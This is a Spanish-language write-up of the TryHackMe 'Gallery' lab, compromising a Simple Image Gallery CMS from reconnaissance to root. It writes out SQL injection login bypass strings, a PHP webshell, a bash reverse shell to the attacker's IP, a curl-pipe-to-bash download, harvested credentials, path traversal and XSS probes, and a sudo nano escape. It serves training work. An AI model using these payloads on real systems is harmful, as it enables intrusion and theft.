---
layout: single
title: Gallery: TryHackMe
excerpt: "Mediante la vulnerabilidad web conocida como SQLI, nos saltaremos la autenticación de un Login y ingresaremos a la cuenta de *Administrator*. Ahí, veremos un apartado para subir fotos a una album, que mediante Fuzzing descubriremos la ruta de donde se aloja. Subiremos una webshell en .php, ya que no valida los tipos de archivos que se suben ganando una ejecución remota de comandos (RCE). Para ganar privilegios abusaremos de nuestros permisos de sudo con *nano*. Tendremos que encontrar antes la contraseña del usuario para listar."
date: 2026-01-23
classes: wide
header:
  teaser: /assets/images/thm-writeup-gallery/logo_gal.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - Pentesting
tags:
  - writeup
  - eJPTv2
  - HackingWeb
  - SQLI
  - BypassAuth
  - CVE-2023-27040
  - FileUpload
  - RemoteAccessRCE
  - WebShell
  - ReverseShell
  - MariaDB
  - InformationLekeage
  - EscaladaPrivilegios
  - Sudo
---

## WRITE UP
IP VÍCITMA-> 10.67.170.17  (TTL 63) LINUX

### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Gallery</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem.py 10.67.170.17
```

-Usar el comando *ping*:

```bash
ping 10.67.170.17 -c1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición*
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.67.170.17 -oG allPorts
Veremos porque el formato grapeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

 ```bash
nmap -sVC -p22,80,8080 10.67.170.17 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
```

### ANÁLISIS SSH: RECONOCIMIENTO

Con *searchsploit* buscaremos si la versión del **SSH** es vulnerable pero como es común encontrarse con esta versión, nunca es.

```bash
searchsploit openssh 8.2p1
```

### ANÁLISIS WEB: RECONOCIMIENTO

Haremos un *whatweb* a la página web por el puerto <span style="color:purple">8080</span>, para conocer tecnologías, lenguaje... Ya que el otro puerto es el Default de Apache. Es lo mismo que la extensión <span style="color:lightyellow">Wappalyzer</span> pero por consola.

```bash
whatweb http://10.67.170.17:8080/
```

Hay un formulario y el lenguaje es **PHP**. 

Entramos a la página y nos saldrá un Login cual de momento no tenemos credenciales.

Se trata del <span style="color:yellow">CMS</span> "**Simple Image**". Buscamos en google:

Herramienta para diseños web cual permite visualizar imágenes de forma profesional.

### POSIBLES EXPLOTACIONES A NIVEL WEB: SQLI

>Una inyección *SQL* **(Structured Query Language)** es un tipo de ataque en el que se intenta explotar vulnerabilidades en el código de una aplicación insertando una consulta SQL en campos de entrada o formulario regulares, como un nombre de usuario o contraseña.

Podemos ver ejemplos de SQLI básicos en **formularios** de Bases de datos, algunos métodos comunes:

- Introduciendo como usuario `name'#`  o `' OR '1'='1` o `' OR 1=1-- -` o `name' or '1'='1'#` -> el símbolo `#` hace que el resto de la consulta, incluyendo la verificación de la contraseña, quede comentado, por lo que no se comprueba la contraseña (Ponemos la que sea).

- Introduciendo en la contraseña `' OR '1'='1` -> esta condición siempre es verdadera, lo que hace que el sistema acepte el acceso sin validar la contraseña real.

Aunque muchas más variaciones estas son las más típicas, lo mejor que como el lenguaje es PHP lo hace más vulnerable.

### BUSCAR CREDENCIALES POTENCIALES

Como carecemos de algún nombre o contraseña vamos a mirar por el código fuente, a ver si vemos algo. "**CTRL + U**"

Filtramos por "admin" y nos llevara a un css que usa una página de plantillas para administración.

Teniendo esto, no nos da un nombre pero como es para administración, podríamos probar con cosas parecidas a <span style="color:blue">admin</span> o <span style="color:blue">administrator</span>...

### SQLI

ALGUNOS PAYLOADS EXITOSOS:

1) 

```
# Usuario
admin' OR '1'='1' -- -

# Contraseña
(cualquier contraseña)
```

2) 

```   
# Usuario
admin'#

# Contraseña
(cualquier contraseña)
```

Accederemos como <span style="color:blue">Administrator</span> al panel del CMS, porque se ha acontecido la vulnerabilidad SQLI.

En el código fuente vemos una ruta cual se refiere al alojamiento de archivos. -> <span style="color:lightblue">/uploads/</span>

Si nos metemos, nos sale un <span style="color:lightblue">/user_1/</span>.

Si recordamos en la página del admin, salía un apartado de "Albums". Cual lo más probable es que corresponda con esta ruta.

### SEARCHSPLOIT: Simple Image Gallery

Si hubiésemos usado *searchsploit* para buscar "<span style="color:yellow">Simple Image Gallery</span>", nos hubiese salido las vulnerabilidades que tiene por versión.

En este caso si nos fijamos en el panel a abajo izquierda, tiene la <span style="color:yellow">v1.0</span> cual permite *SQLI* y *ejecución remota de comandos* (**Remote Code Execution**)

```bash
searchsploit Simple Image Gallery
```

Vamos a mirar el código:

```bash
searchsploit openssh 8.2p1 -x php/webapps/50214.py
```

Ha usado el mismo método que nosotros para bypassear la autenticación del Login.

Para ejecutar comandos vemos que sube una webshell, que se basa sobre el parámetro page=user, para ejecutar código. Esta vulnerabilidad es **CVE-2023-27040**.

Pero nosotros los vamos hacer por otro lado. Nos vamos al apartado "Albums":
Donde se aloja una serie de fotos por álbumes.

### FUZZING: DESCUBRIMIENTO DIRECTORIOS NIVEL WEB

Haremos Fuzzing con *ffuf* para saber en que directorio web se alojan estas fotos.

```bash
ffuf -c -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.65.178.201/gallery/FUZZ/ -fc 404 -mc 200,302,403,401
```

Entre estas, destaca <span style="color:lightblue">/uploads/</span> que es el directorio donde habíamos visto previamente, y estos álbumes alojados en <span style="color:lightblue">/user_1/</span>  con sus respectivas fotos.

Nos metemos en "<span style="color:lightblue">/Album_2/</span>" y nos saldrá una serie de fotos, nos metemos en alguna.

### FILE UPLOAD: WEBSHELL

Como podemos ver la foto de "**album_2**" que corresponde con la de "**Sample Images**".
Encima al tener privilegios a nivel web podemos subir archivos.

Vamos a ver si nos valida al extensión <span style="color:grey">.php</span> .

Crearemos una <span style="color:lime">webshell</span> para poder ejecutar comandos en caso de que funcione, por el parámetro ?**cmd**<span style="color:orange">=</span> . Jugaremos con etiquetas preformateadas para verlo mejor.

```php
<?php echo '<pre>' . system($_GET["cmd"]) . '<pre>'; ?>
```

Le damos a "**Upload**":

Filtramos por todos los archivos y aceptamos.

Subiéndose exitosamente la <span style="color:lime">webshell</span>.

### EJECUCIÓN WEBSHELL: RCE

Para ejecutarla, nos iremos a la ruta del album_2, y como tienen una **id** asignada cada archivo, veremos la de la *webshell* y seguiremos esta sintaxis en la URL:

<span style="color:lime">1769202660.php</span>?**cmd**<span style="color:orange">=</span>

 Después del "=" pondremos el comando a ejecutar cual se interpretara. En este caso probaremos con **id**.

Nos dará salida teniendo una ejecución de comandos exitosa.

### CONFIGURACIÓN NETCAT: REVERSHELL

Ahora nos daremos una <span style="color:lime">Reverseshell</span>.

Lo primero será configurar nuestro *netcat* para recibir el host para victima para cuando enviemos la revershell, nos pondremos en escucha por el puerto <span style="color:purple">443</span>.

```bash
nc -nvlp 443
```

### CONFIGURACIÓN REVERSHELL

Meteremos la línea de <span style="color:lime">revershell</span> en un archivo **.sh** para ejecutarlo en bash como script.
Apuntara a nuestra IP atacante y al puerto en escucha que pusimos.

```bash
echo 'bash -i >& /dev/tcp/192.168.158.89/443 0>&1' > shell.sh
```

### CONFIGURACIÓN SERVIDOR HTTP

Nos abrimos un **servidor http con python3** para que ejecutar un comando que se descargue el la shell.sh y ejecutarla.

```bash
Python3 -m http.server 8000
```

### EJECUTAR REVERSHELL

Ahora nos vamos a la página y ejecutaremos la rever shell de la siguiente forma:

Con **curl** nos descargaremos de nuestro servidor http el script **shell.sh** que esta abierto en esa ruta de donde se aloja. y al final lo concatenaremos un una tubería para que de forma paralela se ejecute en bash.

```bash
1769202660.php?cmd=curl%20http://192.168.158.89:8000/shell.sh|bash
```

>%20 = espacio en la URL

Recibiremos en nuestro **netcat** la conexión de nuestra víctima.
Estaremos como <span style="color:blue">www-data</span>.

### TRATAMIENTO DE LA TTY

1) ```script /dev/null -c bash```

2) ```CTRL + Z```

3) ```stty raw -echo; fg```

4) ```reset xterm```

5) Esperamos, y ```export TERM=xterm```

Y ya tendremos una shell interactiva.

### BUSCA CREDENCIALES

Nos iremos a la siguiente ruta <span style="color:lightblue">/var/www/html/gallery</span> cual listaremos "**ls**", haber que se aloja allí.

Leeremos **initialize.php**, cual va a contener unas credenciales de una base de datos para su acceso.

credenciales: <span style="color:blue">gallery_user</span>:<span style="color:darkred">passw0rd321</span>

Para saber de que Base de datos se trata, miraremos los puertos corriendo en local.
Se trata del <span style="color:purple">3306</span> cual es un *MariaDB*.

```bash
ss -tulnp
```

### ACCESO A MariaDB: HASH ADMINISTRATOR

1) Error
```bash
mysql -u root -h 10.65.178.201
```

2) Usuarios por defecto: "root" or "localhost" tienen acceso denegado a la base de datos.
```bash
mysql -u root -p 
```

3) Entramos con las credenciales encontrados; <span style="color:blue">gallery_user</span>:<span style="color:darkred">passw0rd321</span>
```bash
mysql -u gallery_user -p
```

### COMANDOS
Para mostrar las bases de datos disponibles: <span style="color:lightyellow">show</span> **databases**<span style="color:orange">;</span>

Nos interesa la base de datos <span style="color:gold">gallery_db</span>.

Para usar dicha db: <span style="color:lightyellow">use</span> **gallery_db**<span style="color:orange">;</span>

Para mostrar la información de dicha db, filtraremos sus tablas: <span style="color:lightyellow">show</span> **tables**<span style="color:orange">;</span>

Para seleccionar la tabla:
<span style="color:lightyellow">SELECT * FROM</span> **users**<span style="color:orange">;</span>
Nos lista al usuario administrador con su hash. (No es relevante romperlo, lo podemos ignorar) 

Para salir usamos: 
<span style="color:lightyellow">exit</span>

#### LISTAR USUARIOS DEL SISTEMA

Leeremos el fichero <span style="color:lightblue">/etc/</span><span style="color:grey">passwd</span> para ver que ususarios tienen bash y a cual podríamos acceder.

```bash
cat /etc/passwd | grep sh$
```

(Los otros dos usuarios no serán importantes) En el home de <span style="color:blue">mike</span>, tendrá la flag de usuario pero no tendremos permisos para interactuar con nada. Nos toca buscar sus credenciales

### CREDENCIALES DEL USER MIKE

En el directorio <span style="color:lightblue">/var/backups/</span>, veremos un directorio llamado <span style="color:lightblue">mike_home_backup</span>, nos metemos.

Contendrá como su nombre indica un **backup** de su home, que es lo que hemos visto antes.
En el directorio <span style="color:lightblue">documents</span> habrá una nota con sus cuentas personales, que no son relevantes.

Vamos a leer su historial del bash, haber que comandos puso en su sesión.
Vemos una contraseña -> <span style="color:darkred">b3stpassw0rdbr0xx</span>

```bash
cat .bash_history
```

Probamos las credenciales y son correctas.

```bash
su mike:b3stpassw0rdbr0xx
```

### ACCESO SSH Y BANDERA USER

Como tenemos las credenciales de mike, y el servicio *ssh* abierto, vamos a loguearnos en dicho servicio.

```bash
ssh mike@10.65.178.201 
```

Tratamiento TTY en ssh.

```bash
export TERM=xterm
```

En el <span style="color:lightblue">/home/mike</span> leemos la bandera de usuario.

### ESCALADA DE PRIVILEGIOS: ABUSE SUDOERS PRIVILEGE: (script) ROOTKIT.SH

Listamos nuestros permisos de *sudo* disponibles como usuario para ver si tenemos algún privilegio de cual aprovecharnos.

```bash
sudo -l
```

Nos lista uno que no pide contraseña y que es de root. Podemos usar **bash** como <span style="color:blue">root</span> para el ejecutar el script en bash "<span style="color:lime">rootkit.sh</span>" en el directorio <span style="color:lightblue">/opt/</span>.

Nos metemos a la ruta y vemos que el script pertenece al usuario y grupo de <span style="color:blue">root</span>.

```bash
ls -l
o
ll
```

Vamos a leer que contiene:

```bash
cat rootkit.sh
```

>**Para administrar la herramienta de seguridad rkhunter**, permitiendo al usuario **elegir qué acción ejecutar** desde la terminal: comprobar la versión instalada (_versioncheck_), **actualizar la base de datos** (_update_), **listar configuraciones o datos** (_list_) o **leer el reporte generado** (_read_), todo mediante un menú simple que ejecuta el comando correspondiente según la opción ingresada

Para ejecutar el script: ```sudo /bin/bash /opt/rootkit.sh```

Escogeremos la opción "**read**" ya que usa el editor nano sobre un fichero y puede ser una vía potencial para escalar privilegios.

### SHELL ROOT: NANO

Nos ayudaremos del repositorio online: [GTF Obins](https://gtfobins.org/)

Nos dice los pasos a ejecutar cuando estemos dentro de un fichero y así convertirnos en usuario privilegiado.

<iframe src="https://gtfobins.org/gtfobins/nano/" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>

1) Apretamos "**CTRL + R**"  y  "**CTRL + X**"

2) Seguidamente: **reset; sh 1>&0 2>&0**

Nos dará la opción de ejecutar código y para confirmar que somos <span style="color:blue">root</span>, pondremos "**id**". 
Exitosamente hemos escalado privilegios.

Para darnos la shell completa:

```bash
bash  -p
```

### BANDERA ROOT

Para coger la bandera de <span style="color:blue">root</span>, nos vamos a su home <span style="color:lightblue">/root/</span> y la leeremos. "**cat**"

<hr>
<br>
### COSAS EXTRAS
### POSIBLE LFI

En la página podríamos haber probado en los parámetros cosas de este estilo para ver si carga elementos externos nivel local, en caso de estar mal sanitizado, pro no funcionan. 

page=

page=../../../../etc/passwd

Por si tiene alguna restricción y borra las barras, no borren la segunda:
page=..//..//..//..//etc//passwd

### POSIBLE COOKIE HIJACKING + STORED XSS (CROSS SITE-SCRIPTING)

Si nos vamos a las cookies de sesión desde la **DEV TOOLS** vemos que esta en **FALSE**:

-*httpOnly* (significa que una cookie es accesible desde el lado del cliente, permitiendo que scripts como **JavaScript** lean o manipulen su contenido)

-*Secure* (la cookie viaja por http)

Le damos a añadir nuevo "albúm" y ponemos de nombre un simple script para probar si se refleja el xss:

``<script>alert(1)</script>``

Se refleja, aunque no quiere decir que sea peligroso. Aunque para esta máquina no es necesario tocar nada esto, se podría intentar un *robo de cookies* **(Cookie Hijacking)** aunque es inútil.

Si le damos al albúm nos refleja nuevamente.

